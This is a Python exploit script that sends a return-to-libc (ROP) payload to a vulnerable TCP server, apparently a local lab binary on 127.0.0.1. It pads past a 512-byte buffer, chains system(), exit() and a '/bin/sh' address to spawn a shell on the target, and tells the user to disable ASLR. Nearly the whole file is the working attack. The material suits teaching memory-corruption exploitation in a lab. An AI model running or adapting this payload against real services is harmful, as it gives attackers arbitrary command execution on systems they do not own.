#!/usr/bin/python3
import socket
import struct
import sys
import time

# Target information
target_ip = "127.0.0.1"
target_port = 40000

# Buffer overflow parameters
buffer_size = 512  # Adjust based on your findings

# Function to get addresses from GDB
def get_addresses():
    print("[*] To find the correct addresses, run these commands in GDB:")
    print("    gdb -q ./tcpserver-nonexecstack")
    print("    (gdb) b main")
    print("    (gdb) r 40000")
    print("    (gdb) p system")
    print("    (gdb) p exit")
    print("    (gdb) find &system,+999999,\"/bin/sh\"")
    print()
    
    system_addr = input("[?] Enter system() address (e.g., 0xf7e12420): ")
    exit_addr = input("[?] Enter exit() address (e.g., 0xf7e04f80): ")
    binsh_addr = input("[?] Enter \"/bin/sh\" string address (e.g., 0xf7f5b352): ")
    
    # Convert input to integers
    try:
        system_addr = int(system_addr, 16)
        exit_addr = int(exit_addr, 16)
        binsh_addr = int(binsh_addr, 16)
    except ValueError:
        print("[-] Invalid address format. Use hexadecimal format (e.g., 0xf7e12420).")
        sys.exit(1)
        
    return system_addr, exit_addr, binsh_addr

# Create and send ROP exploit
def send_rop_exploit(system_addr, exit_addr, binsh_addr):
    # Create padding to reach the return address
    padding = b"A" * buffer_size
    
    # ROP chain: system() + exit() + "/bin/sh" string
    rop_chain = struct.pack("<III", system_addr, exit_addr, binsh_addr)
    
    # Full payload
    payload = padding + rop_chain
    
    print(f"[*] ROP Chain:")
    print(f"    system() @ 0x{system_addr:08x}")
    print(f"    exit() @ 0x{exit_addr:08x}")
    print(f"    \"/bin/sh\" @ 0x{binsh_addr:08x}")
    print(f"[*] Total payload size: {len(payload)} bytes")
    
    try:
        # Connect to target
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, target_port))
        print(f"[+] Connected to {target_ip}:{target_port}")
        
        # Send payload
        print("[+] Sending ROP chain payload...")
        s.send(payload)
        s.close()
        print("[+] Payload sent successfully!")
        
        print("[*] If the exploit worked, you should have a shell on the target.")
        print("[*] There will be no reverse connection - the shell is running on the target.")
        
        return True
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return False

# Main function
def main():
    print("===== Return-Oriented Programming (ROP) Exploit =====")
    print("[*] This script creates a ROP chain to execute system(\"/bin/sh\")")
    print("[*] Make sure ASLR is disabled: echo 0 > /proc/sys/kernel/randomize_va_space")
    print()
    
    # Get addresses for our ROP chain
    system_addr, exit_addr, binsh_addr = get_addresses()
    
    # Send the exploit
    send_rop_exploit(system_addr, exit_addr, binsh_addr)
    
    print("[*] If the exploit didn't work, verify:")
    print("    1. ASLR is disabled")
    print("    2. The buffer size is correct (currently {})".format(buffer_size))
    print("    3. The addresses are correct")
    print("    4. Try finding a different \"/bin/sh\" string in memory")

if __name__ == "__main__":
    main()